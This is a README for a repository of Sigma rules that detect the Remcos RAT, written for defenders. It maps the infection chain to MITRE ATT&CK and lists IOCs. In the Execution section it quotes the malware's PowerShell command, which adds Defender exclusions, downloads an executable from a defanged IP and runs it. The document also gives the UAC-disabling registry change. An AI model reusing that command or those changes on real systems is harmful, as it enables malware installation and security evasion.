# Sigma Rules for Remcos RAT Detection

## Overview
This repository provides Sigma rules to detect activities related to the Remcos RAT, a Remote Access Trojan used for malicious purposes. The rules are designed to detect various tactics and techniques used by this malware, including initial access, execution, persistence, defense evasion, discovery, collection, and command & control.

## Sigma Rule
- **File Name**: `remcos_rat_detection.yml`
- **Description**: The Sigma rule in this repository is designed to detect various stages of the Remcos RAT attack chain, including execution, persistence, defense evasion, and data exfiltration. Each rule is mapped to its corresponding MITRE ATT&CK technique for better correlation in a SOC environment.

## Analysis of Remcos RAT Behavior

The following steps outline the Remcos RAT infection process and its mapped techniques in the MITRE ATT&CK framework:

### Initial Access
- **IP Address:** `141[.]95[.]16[.]111:8080`
- This IP hosts malicious files, including a `.bat` script (`recover.bat`).
- **MITRE ATT&CK Technique:** T1566 (Phishing)

###  Execution
- **MITRE ATT&CK Technique:** T1059.001 (PowerShell)

PowerShell command executed by the malware:
PowerShell
PowerShell.exe -WindowStyle hidden "Add-MpPreference -ExclusionExtension "%userprofile%\AppData\Local\Temp"; 
Add-MpPreference -ExclusionExtension ".exe"; Start-Sleep -Seconds 5; 
Invoke-WebRequest 'http://141[.]95[.]16[.]111:8080/RiotGames.exe' -OutFile '%userprofile%\AppData\Local\Temp\RiotGames.exe'; 
cmd.exe /c %userprofile%\AppData\Local\Temp\RiotGames.exe"

### Defense Evasion
- **MITRE ATT&CK Technique:** T1548.002 (Bypass User Account Control)
    - The malware disables User Account Control (UAC) by modifying the following registry key:
    ```plaintext
    HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
    ```
    - The `EnableLUA` value is set to `0` to disable UAC.

###  Persistence
- **MITRE ATT&CK Technique:** T1547.001 (Registry Run Keys/Startup Folder)
    - The malware copies itself to the directory:
    ```plaintext
    C:\ProgramData\Terminal\terminal.exe
    ```
    - It creates entries in the following registry keys to ensure persistence:
        - `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
        - `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

###  Discovery
- **MITRE ATT&CK Technique:** T1083 (File and Directory Discovery)
    - The malware scans the system for important files and directories.

### Collection and Exfiltration
- **MITRE ATT&CK Techniques:**
    - **T1113 (Screen Capture):** The malware captures screenshots.
    - **T1056.001 (Keylogging):** It logs keystrokes to a file named `logs.dat` in `C:\ProgramData\Terminal`.
    - **T1041 (Exfiltration Over Command and Control Channel):** The malware exfiltrates captured data via the command-and-control server.

### Step 7: Command and Control
- **MITRE ATT&CK Technique:** T1071.001 (Application Layer Protocol: Web Protocols)
    - The malware communicates with the C2 server at `141[.]95[.]16[.]111:2404` and uses the URL `http[:]//geoplugin[.]net/json[.]gp` to collect geolocation data.

## List of Indicators of Compromise (IOCs)

| Indicator                               | Type        | Remarks          	|
| --------------------------------------- | ----------- | ----------------------|	
| 4388789C81AFD593C5FC2F0249502153        | MD5 File Hash | recover.bat     	|
| 5379d703170770355efdbce86dcdb1d3        | MD5 File Hash | RiotGames.exe   	|
| b28167faf2bcf0150d5e816346abb42d        | MD5 File Hash | newpy.exe        	|
| 25fca21c810a8ffabf4fdf3b1755c73c        | MD5 File Hash | echo-4662-2DF5.exe 	|
| 791545E6E3C5EB61DD12CCFBAE1B9982        | MD5 File Hash | 123.exe          	|
| 141[.]95[.]16[.]111                     | IP Address   | C2 Server       	|
| http[:]//geoplugin[.]net/json[.]gp      | URL          | Geolocation Service 	|

## MITRE ATT&CK Tactics and Techniques

| Tactic                               | Technique                                            |
| ------------------------------------ | -----------------------------------------------------|
| **Initial Access (TA0001)**          | T1566: Phishing                                      |
| **Execution (TA0002)**               | T1204.002: Malicious File                            |
|                                      | T1059.001: PowerShell                                |
| **Persistence (TA0003)**             | T1547.001: Registry Run Keys/Startup Folder          |
| **Defense Evasion (TA0005)**         | T1112: Modify Registry                               |
|                                      | T1548.002: Bypass User Account Control               |
|                                      | T1055: Process Injection                             |
| **Discovery (TA0007)**               | T1083: File and Directory Discovery                  |
|                                      | T1082: System Information Discovery                  |
| **Collection (TA0009)**              | T1113: Screen Capture                                |
|                                      | T1123: Audio Capture                                 |
|                                      | T1115: Clipboard Data                                |
|                                      | T1056.001: Input Capture: Keylogging                 |
| **Exfiltration (TA0010)**            | T1041: Exfiltration Over Command-and-Control Channel |
| **Command & Control (TA0011)**       | T1071.001: Application Layer Protocol: Web Protocols |


## Usage

1. Clone the repository.
2. Import the Sigma rules into your SIEM for real-time monitoring and alerting.
3. Customize the rules based on your environment to reduce false positives.

## Contributing
Contributions are welcome! Please submit a pull request or raise an issue to improve the detection rules.

## References
- [Sigma GitHub Repository](https://github.com/SigmaHQ/sigma)
- [CYFIRMA Report on Remcos RAT](https://www.cyfirma.com/research/the-persistent-danger-of-remcos-rat/)
